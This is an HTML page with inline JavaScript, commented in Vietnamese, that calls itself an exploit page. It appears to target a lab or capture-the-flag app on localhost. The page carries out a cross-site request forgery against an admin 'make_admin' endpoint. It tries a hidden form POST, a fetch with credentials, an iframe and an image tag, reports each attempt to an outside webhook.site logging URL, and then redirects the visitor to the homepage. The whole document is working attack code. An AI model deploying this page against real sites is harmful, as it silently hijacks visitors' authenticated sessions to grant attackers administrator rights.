<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK_URL = 'https://webhook.site/f66fca39-1067-4e05-8b60-3e3809393602';

// Hàm gửi log đến webhook
function sendLog(message) {
  fetch(WEBHOOK_URL + '?log=' + encodeURIComponent(message), { mode: 'no-cors' });
}

sendLog('Exploit page loaded: ' + window.location.href);

// Thử các phương án khác nhau
const targetURL = 'http://127.0.0.1:5000/admin/make_admin/2';

// Phương án 1: Form submit
try {
  sendLog('Trying method 1: Form submit');
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = targetURL;
  form.style.display = 'none';
  document.body.appendChild(form);
  form.submit();
  sendLog('Form submitted');
} catch(e) {
  sendLog('Form error: ' + e.message);
}

// Phương án 2: Fetch với credentials
setTimeout(() => {
  try {
    sendLog('Trying method 2: Fetch with credentials');
    fetch(targetURL, {
      method: 'POST',
      credentials: 'include',
      mode: 'no-cors'
    }).then(() => {
      sendLog('Fetch completed');
    }).catch(e => {
      sendLog('Fetch error: ' + e.message);
    });
  } catch(e) {
    sendLog('Fetch setup error: ' + e.message);
  }
}, 100);

// Phương án 3: Iframe
setTimeout(() => {
  try {
    sendLog('Trying method 3: Iframe');
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = targetURL;
    document.body.appendChild(iframe);
    sendLog('Iframe loaded');
  } catch(e) {
    sendLog('Iframe error: ' + e.message);
  }
}, 200);

// Phương án 4: Image tag (GET request)
setTimeout(() => {
  try {
    sendLog('Trying method 4: Image GET');
    const img = document.createElement('img');
    img.src = targetURL;
    img.style.display = 'none';
    img.onload = () => sendLog('Image loaded');
    img.onerror = () => sendLog('Image error');
    document.body.appendChild(img);
  } catch(e) {
    sendLog('Image error: ' + e.message);
  }
}, 300);

// Redirect về trang chủ sau 2 giây
setTimeout(() => {
  sendLog('Redirecting to homepage');
  window.location = 'http://127.0.0.1:5000/';
}, 2000);
</script>
</body>
</html>